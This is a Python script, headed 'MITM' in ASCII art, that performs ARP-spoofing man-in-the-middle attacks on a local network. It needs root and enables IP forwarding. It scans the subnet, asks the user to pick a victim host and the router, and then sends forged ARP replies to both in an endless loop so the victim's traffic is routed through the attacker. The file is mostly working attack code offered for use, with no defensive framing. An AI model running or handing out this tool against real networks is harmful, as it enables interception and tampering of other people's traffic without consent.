from scapy.all import ARP, Ether, srp   
import scapy.all as scap
import os
import threading as th
import time
import platform
import ipaddress
import signal
import netifaces as ni

def checkSystem():
    os.system('cls' if os.name == 'nt' else 'clear')
    if os.geteuid() != 0:
        raise SystemExit("You must run the program with root privileges.")

    version = platform.version()
    split1 = version.split("-")[1]
    split2 = split1.split(" ")[0]

    if split2 == "Ubuntu" or "Debian":
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

        
def graphBar():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(" __  __ ___ _____ __  __ ")
    print("|  \/  |_ _|_   _|  \/  |")
    print("| |\/| || |  | | | |\/| |")
    print("| |  | || |  | | | |  | |")
    print("|_|  |_|___| |_| |_|  |_|")

    print("")

def login():
    os.chdir("/sys/class/net")
    interface_names = os.listdir()
    print(interface_names)
    global discovering
    discovering = input("on which interface would you like to discover network ? (1, 2, 3)...")
    ip = ni.ifaddresses(interface_names[int(discovering)-1])[ni.AF_INET][0]['addr']
    ip1, ip2, ip3, _ = ip.split(".")
    target_ip = ip1+'.'+ip2+'.'+ip3+'.0/24'
    print(target_ip)
    if not checkIP(target_ip):
        os.system('cls' if os.name == 'nt' else 'clear')
        graphBar()
        print("This is not a valid IP, try again")
        login()

    return target_ip

def scan(target):
    global ip
    global mac
    done = False

    def animation():
        where = 0
        animation_symbol = "|/-\\|/-"
        while not done:
            print("Scanning...",animation_symbol[where], end="\r")
            time.sleep(0.1) 
            where += 1
            if where == len(animation_symbol):
                where = 0

    t = th.Thread(target=animation)
    t.start()

    arp = ARP(pdst=target)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]

    ip = []
    mac = []

    for _, received in result:
        ip.append(received.psrc)
        mac.append(received.hwsrc)

    done = True

    return ip, mac
    
def isGoodNetwork(target, ip, mac):
    if len(ip) <= 1:
        global victim
        global router
        userInput = input("There's no one in this network, are you sure it is the one you meant to explore ? If you are, you can refresh with: 'refresh'.\nYou can quit with 'ctrl+c'.\nYou can also change your network target simply by typing 'change'\n")
        if userInput == "refresh":
            graphBar()
            print("Refreshing network", target)
            ip, mac = scan(target)
            victim, router = isGoodNetwork(target, ip, mac)
            return victim, router
        elif userInput == "change":
            graphBar()
            target = login()
            ip, mac = scan(target)
            victim, router = isGoodNetwork(target, ip, mac)
            return victim, router
    else:
        print("ips in the network" , ip)
        victim = input("Select your target ip. (1, 2, 3)...\n")
        ip1, ip2, ip3, _ = ip[0].split(".")
        router = ip1+'.'+ip2+'.'+ip3+'.254'
        isItRouter = input(router+ " is it your target router ? y/n\n")
        if isItRouter == "n":
            router = input("Select router ip. (1, 2, 3)... (Usually ends by .254)\n")
            router = ip[int(router)-1]
        return victim, router

def checkIP(ipCheck):
    result = True
    try:
        ipaddress.ip_network(ipCheck)
    except:
        result = False
    return result

def handler(signum, frame):
    res = input("Ctrl-c was pressed. Do you really want to exit? y/n\n")
    if res == "y":
        print("farewell")
        exit(1)

def main():
    victim, router = 0, 0
    checkSystem()
    graphBar()
    target = login()
    ip, mac = scan(target)
    victim, router = isGoodNetwork(target, ip, mac)

    verboseShow = input("Would you like to see verbose? (shows every packet send.) y/n\n")
    if verboseShow == "y":
        verboseShow = True
    else:
        verboseShow = False
    print("Start sending packets.")
    signal.signal(signal.SIGINT, handler)

    while True: 
        arp_response = ARP(pdst=ip[int(victim)-1], hwdst=mac[int(victim)-1], psrc=router)
        scap.send(arp_response, count = 1, verbose=verboseShow)
        arp_response = ARP(pdst=router, hwdst=router, psrc=ip[int(victim)-1])
        scap.send(arp_response, count = 1, verbose=verboseShow) 

if __name__ == '__main__':
    main()